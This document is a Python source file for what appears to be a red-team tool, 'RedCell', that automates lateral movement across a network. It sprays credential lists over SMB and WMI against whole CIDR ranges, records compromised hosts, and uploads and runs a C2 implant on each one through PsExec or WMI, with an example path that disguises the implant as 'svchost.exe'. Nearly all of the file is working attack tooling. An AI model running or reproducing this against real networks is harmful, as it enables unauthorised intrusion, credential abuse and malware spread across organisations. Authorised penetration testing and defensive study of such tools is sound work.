"""
Automated Lateral Movement Scanner

Network-wide lateral movement and credential testing.
"""

import platform
import ipaddress
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass, asdict
from datetime import datetime
import json
import concurrent.futures
from collections import defaultdict

from lateral_movement.smb_wmi import SMBExecution, WMIExecution


@dataclass
class LateralTarget:
    """Represents a lateral movement target."""

    ip: str
    hostname: Optional[str] = None
    os_type: Optional[str] = None
    shares: List[str] = None
    services: List[str] = None
    compromised: bool = False
    access_method: Optional[str] = None
    credentials_used: Optional[str] = None

    def __post_init__(self):
        if self.shares is None:
            self.shares = []
        if self.services is None:
            self.services = []

    def to_dict(self) -> Dict:
        """Convert to dictionary."""
        return asdict(self)


@dataclass
class MovementResult:
    """Result of a lateral movement attempt."""

    target: str
    success: bool
    method: str
    credentials: str
    timestamp: str
    details: str = ""
    error: Optional[str] = None

    def to_dict(self) -> Dict:
        """Convert to dictionary."""
        return asdict(self)


class AutomatedLateralMovement:
    """
    Automated lateral movement scanner.

    Features:
    - Network target discovery
    - Credential spraying
    - SMB/WMI lateral movement
    - Implant deployment
    - Comprehensive reporting
    """

    def __init__(
        self,
        credentials: List[Tuple[str, str, str]] = None,
        domain: str = ".",
        max_workers: int = 5
    ):
        """
        Initialize automated lateral movement.

        Args:
            credentials: List of (username, password, domain) tuples
            domain: Default domain
            max_workers: Max concurrent threads
        """
        self.credentials = credentials or []
        self.domain = domain
        self.max_workers = max_workers
        self.os_type = platform.system().lower()

        self.targets: Dict[str, LateralTarget] = {}
        self.results: List[MovementResult] = []
        self.compromised_hosts: List[str] = []

        self.scan_stats = {
            'start_time': None,
            'end_time': None,
            'targets_scanned': 0,
            'hosts_compromised': 0,
            'credentials_tested': 0,
            'successful_movements': 0
        }

    def add_credential(self, username: str, password: str, domain: str = None):
        """
        Add credential to test.

        Args:
            username: Username
            password: Password
            domain: Domain (optional)
        """
        if domain is None:
            domain = self.domain

        self.credentials.append((username, password, domain))
        print(f"[+] Added credential: {domain}\\{username}")

    def add_target(self, ip: str, hostname: str = None):
        """
        Add target to scan.

        Args:
            ip: Target IP address
            hostname: Target hostname (optional)
        """
        if ip not in self.targets:
            self.targets[ip] = LateralTarget(ip=ip, hostname=hostname)
            print(f"[+] Added target: {ip}")

    def add_target_range(self, cidr: str):
        """
        Add range of targets from CIDR notation.

        Args:
            cidr: CIDR notation (e.g., "192.168.1.0/24")
        """
        try:
            network = ipaddress.ip_network(cidr, strict=False)

            print(f"[*] Adding targets from {cidr}...")

            for ip in network.hosts():
                self.add_target(str(ip))

            print(f"[+] Added {network.num_addresses - 2} targets")

        except Exception as e:
            print(f"[-] Error parsing CIDR range: {e}")

    def test_smb_access(
        self,
        target: str,
        username: str,
        password: str,
        domain: str
    ) -> Tuple[bool, str]:
        """
        Test SMB access to target.

        Args:
            target: Target IP/hostname
            username: Username
            password: Password
            domain: Domain

        Returns:
            Tuple of (success, details)
        """
        try:
            smb = SMBExecution(
                target=target,
                username=username,
                password=password,
                domain=domain
            )

            if smb.test_connection():
                # Enumerate shares
                shares = smb.enumerate_shares()

                if target in self.targets:
                    self.targets[target].shares = shares

                return True, f"SMB access successful, {len(shares)} shares"

            return False, "SMB connection failed"

        except Exception as e:
            return False, f"SMB error: {str(e)}"

    def test_wmi_access(
        self,
        target: str,
        username: str,
        password: str,
        domain: str
    ) -> Tuple[bool, str]:
        """
        Test WMI access to target.

        Args:
            target: Target IP/hostname
            username: Username
            password: Password
            domain: Domain

        Returns:
            Tuple of (success, details)
        """
        try:
            wmi = WMIExecution(
                target=target,
                username=username,
                password=password,
                domain=domain
            )

            # Try to get system info
            info = wmi.get_system_info()

            if info:
                if target in self.targets:
                    if 'os' in info:
                        self.targets[target].os_type = info['os']

                return True, f"WMI access successful"

            return False, "WMI query failed"

        except Exception as e:
            return False, f"WMI error: {str(e)}"

    def attempt_lateral_movement(
        self,
        target: str,
        username: str,
        password: str,
        domain: str
    ) -> Optional[MovementResult]:
        """
        Attempt lateral movement to target.

        Args:
            target: Target IP/hostname
            username: Username
            password: Password
            domain: Domain

        Returns:
            MovementResult or None
        """
        cred_string = f"{domain}\\{username}"

        # Try SMB first
        success, details = self.test_smb_access(target, username, password, domain)

        if success:
            result = MovementResult(
                target=target,
                success=True,
                method='SMB',
                credentials=cred_string,
                timestamp=datetime.now().isoformat(),
                details=details
            )

            if target in self.targets:
                self.targets[target].compromised = True
                self.targets[target].access_method = 'SMB'
                self.targets[target].credentials_used = cred_string

            if target not in self.compromised_hosts:
                self.compromised_hosts.append(target)
                self.scan_stats['hosts_compromised'] += 1

            self.scan_stats['successful_movements'] += 1

            return result

        # Try WMI if SMB failed
        success, details = self.test_wmi_access(target, username, password, domain)

        if success:
            result = MovementResult(
                target=target,
                success=True,
                method='WMI',
                credentials=cred_string,
                timestamp=datetime.now().isoformat(),
                details=details
            )

            if target in self.targets:
                self.targets[target].compromised = True
                self.targets[target].access_method = 'WMI'
                self.targets[target].credentials_used = cred_string

            if target not in self.compromised_hosts:
                self.compromised_hosts.append(target)
                self.scan_stats['hosts_compromised'] += 1

            self.scan_stats['successful_movements'] += 1

            return result

        # Both failed
        return MovementResult(
            target=target,
            success=False,
            method='SMB/WMI',
            credentials=cred_string,
            timestamp=datetime.now().isoformat(),
            error=details
        )

    def spray_credentials(
        self,
        targets: List[str] = None,
        stop_on_success: bool = True
    ) -> List[MovementResult]:
        """
        Spray credentials across targets.

        Args:
            targets: List of target IPs (or use all added targets)
            stop_on_success: Stop testing other creds when one succeeds

        Returns:
            List of MovementResults
        """
        if targets is None:
            targets = list(self.targets.keys())

        if not targets:
            print("[-] No targets to test")
            return []

        if not self.credentials:
            print("[-] No credentials to test")
            return []

        print(f"\n[*] Starting credential spray...")
        print(f"[*] Targets: {len(targets)}")
        print(f"[*] Credentials: {len(self.credentials)}")
        print(f"[*] Max workers: {self.max_workers}")
        print("-" * 80)

        results = []

        for target in targets:
            target_compromised = False

            for username, password, domain in self.credentials:
                self.scan_stats['credentials_tested'] += 1

                print(f"[*] Testing {domain}\\{username} on {target}...")

                result = self.attempt_lateral_movement(
                    target,
                    username,
                    password,
                    domain
                )

                if result:
                    results.append(result)

                    if result.success:
                        print(f"[+] SUCCESS: {target} via {result.method}")
                        target_compromised = True

                        if stop_on_success:
                            break

            self.scan_stats['targets_scanned'] += 1

        return results

    def deploy_implant(
        self,
        target: str,
        implant_path: str,
        remote_path: str,
        c2_url: str
    ) -> bool:
        """
        Deploy C2 implant to compromised target.

        Args:
            target: Target IP/hostname
            implant_path: Local implant file path
            remote_path: Remote destination path
            c2_url: C2 server URL

        Returns:
            True if successful
        """
        if target not in self.targets:
            print(f"[-] Target {target} not found")
            return False

        target_obj = self.targets[target]

        if not target_obj.compromised:
            print(f"[-] Target {target} not compromised")
            return False

        print(f"[*] Deploying implant to {target}...")

        try:
            # Extract credentials
            if not target_obj.credentials_used:
                print(f"[-] No credentials available for {target}")
                return False

            # Parse credentials
            parts = target_obj.credentials_used.split('\\')
            if len(parts) == 2:
                domain = parts[0]
                username = parts[1]
            else:
                username = parts[0]
                domain = "."

            # Get password from credentials list
            password = None
            for u, p, d in self.credentials:
                if u == username and d == domain:
                    password = p
                    break

            if not password:
                print(f"[-] Password not found for {username}")
                return False

            # Use SMB for file upload
            smb = SMBExecution(
                target=target,
                username=username,
                password=password,
                domain=domain
            )

            # Upload implant
            if smb.upload_file(implant_path, remote_path):
                print(f"[+] Implant uploaded to {target}")

                # Execute implant via PSExec or WMI
                if target_obj.access_method == 'SMB':
                    command = remote_path.replace('$', ':')
                    if smb.psexec_execute(command):
                        print(f"[+] Implant executed on {target}")
                        return True

                elif target_obj.access_method == 'WMI':
                    wmi = WMIExecution(target, username, password, domain)
                    command = remote_path.replace('$', ':')
                    if wmi.execute_command(command):
                        print(f"[+] Implant executed on {target}")
                        return True

            return False

        except Exception as e:
            print(f"[-] Error deploying implant: {e}")
            return False

    def run_automated_scan(
        self,
        target_range: str = None,
        deploy_implants: bool = False,
        implant_config: Dict = None
    ) -> Dict:
        """
        Run fully automated lateral movement scan.

        Args:
            target_range: CIDR range to scan (optional)
            deploy_implants: Deploy C2 implants to compromised hosts
            implant_config: Config for implant deployment

        Returns:
            Scan results dictionary
        """
        self.scan_stats['start_time'] = datetime.now().isoformat()

        print("=" * 80)
        print("REDCELL AUTOMATED LATERAL MOVEMENT SCANNER")
        print("=" * 80)
        print(f"Start time: {self.scan_stats['start_time']}")
        print(f"Credentials: {len(self.credentials)}")
        print("=" * 80)

        # Add target range if specified
        if target_range:
            self.add_target_range(target_range)

        # Spray credentials
        self.results = self.spray_credentials()

        # Deploy implants if requested
        if deploy_implants and implant_config:
            print(f"\n[*] Deploying implants to {len(self.compromised_hosts)} hosts...")

            for target in self.compromised_hosts:
                self.deploy_implant(
                    target,
                    implant_config['implant_path'],
                    implant_config['remote_path'],
                    implant_config['c2_url']
                )

        self.scan_stats['end_time'] = datetime.now().isoformat()

        return self.generate_results()

    def generate_results(self) -> Dict:
        """
        Generate comprehensive results.

        Returns:
            Results dictionary
        """
        return {
            'stats': self.scan_stats,
            'targets': {ip: target.to_dict() for ip, target in self.targets.items()},
            'compromised_hosts': self.compromised_hosts,
            'results': [r.to_dict() for r in self.results],
            'credential_success_rate': self._calculate_success_rate()
        }

    def _calculate_success_rate(self) -> Dict:
        """Calculate credential success rates."""
        success_by_cred = defaultdict(lambda: {'attempts': 0, 'successes': 0})

        for result in self.results:
            cred = result.credentials
            success_by_cred[cred]['attempts'] += 1

            if result.success:
                success_by_cred[cred]['successes'] += 1

        rates = {}
        for cred, stats in success_by_cred.items():
            if stats['attempts'] > 0:
                rate = (stats['successes'] / stats['attempts']) * 100
                rates[cred] = {
                    'attempts': stats['attempts'],
                    'successes': stats['successes'],
                    'rate': round(rate, 2)
                }

        return rates

    def generate_report(self) -> str:
        """
        Generate formatted report.

        Returns:
            Report string
        """
        report = []
        report.append("=" * 80)
        report.append("LATERAL MOVEMENT SCAN REPORT")
        report.append("=" * 80)

        # Stats
        report.append(f"\nScan Statistics:")
        report.append(f"  Start: {self.scan_stats['start_time']}")
        report.append(f"  End: {self.scan_stats['end_time']}")
        report.append(f"  Targets Scanned: {self.scan_stats['targets_scanned']}")
        report.append(f"  Hosts Compromised: {self.scan_stats['hosts_compromised']}")
        report.append(f"  Credentials Tested: {self.scan_stats['credentials_tested']}")
        report.append(f"  Successful Movements: {self.scan_stats['successful_movements']}")

        # Compromised hosts
        if self.compromised_hosts:
            report.append("\n" + "=" * 80)
            report.append("COMPROMISED HOSTS")
            report.append("=" * 80)

            for target in self.compromised_hosts:
                target_obj = self.targets[target]
                report.append(f"\n{target}")
                report.append(f"  Hostname: {target_obj.hostname or 'Unknown'}")
                report.append(f"  OS: {target_obj.os_type or 'Unknown'}")
                report.append(f"  Access Method: {target_obj.access_method}")
                report.append(f"  Credentials: {target_obj.credentials_used}")
                report.append(f"  Shares: {', '.join(target_obj.shares) if target_obj.shares else 'None'}")

        # Credential success rates
        rates = self._calculate_success_rate()
        if rates:
            report.append("\n" + "=" * 80)
            report.append("CREDENTIAL SUCCESS RATES")
            report.append("=" * 80)

            for cred, stats in sorted(rates.items(), key=lambda x: x[1]['rate'], reverse=True):
                report.append(f"\n{cred}")
                report.append(f"  Attempts: {stats['attempts']}")
                report.append(f"  Successes: {stats['successes']}")
                report.append(f"  Success Rate: {stats['rate']}%")

        report.append("\n" + "=" * 80)
        return "\n".join(report)

    def export_results(self, filename: str):
        """
        Export results to JSON file.

        Args:
            filename: Output filename
        """
        results = self.generate_results()

        with open(filename, 'w') as f:
            json.dump(results, f, indent=2)

        print(f"\n[+] Results exported to: {filename}")


def main():
    """Main function for standalone usage."""
    import argparse

    parser = argparse.ArgumentParser(description='RedCell Automated Lateral Movement')
    parser.add_argument('--targets', '-t', help='Target IP or CIDR range')
    parser.add_argument('--username', '-u', action='append', help='Username (can specify multiple)')
    parser.add_argument('--password', '-p', action='append', help='Password (can specify multiple)')
    parser.add_argument('--domain', '-d', default='.', help='Domain')
    parser.add_argument('--cred-file', help='File with credentials (format: username:password:domain)')

    parser.add_argument('--deploy', action='store_true', help='Deploy implants to compromised hosts')
    parser.add_argument('--implant', help='Implant file path')
    parser.add_argument('--remote-path', help='Remote implant path (e.g., C$\\temp\\svchost.exe)')
    parser.add_argument('--c2-url', help='C2 server URL')

    parser.add_argument('--export', help='Export results to JSON file')
    parser.add_argument('--workers', type=int, default=5, help='Max concurrent workers')

    args = parser.parse_args()

    # Initialize scanner
    scanner = AutomatedLateralMovement(max_workers=args.workers, domain=args.domain)

    # Add credentials
    if args.cred_file:
        try:
            with open(args.cred_file) as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        parts = line.split(':')
                        if len(parts) >= 2:
                            username = parts[0]
                            password = parts[1]
                            domain = parts[2] if len(parts) > 2 else args.domain
                            scanner.add_credential(username, password, domain)
        except Exception as e:
            print(f"[-] Error reading credential file: {e}")
            return

    elif args.username and args.password:
        if len(args.username) != len(args.password):
            print("[-] Number of usernames and passwords must match")
            return

        for username, password in zip(args.username, args.password):
            scanner.add_credential(username, password, args.domain)

    else:
        print("[-] No credentials specified (use --username/--password or --cred-file)")
        return

    # Prepare implant config
    implant_config = None
    if args.deploy:
        if not all([args.implant, args.remote_path, args.c2_url]):
            print("[-] Implant deployment requires --implant, --remote-path, and --c2-url")
            return

        implant_config = {
            'implant_path': args.implant,
            'remote_path': args.remote_path,
            'c2_url': args.c2_url
        }

    # Run scan
    results = scanner.run_automated_scan(
        target_range=args.targets,
        deploy_implants=args.deploy,
        implant_config=implant_config
    )

    # Generate report
    print("\n")
    print(scanner.generate_report())

    # Export if requested
    if args.export:
        scanner.export_results(args.export)


if __name__ == '__main__':
    main()
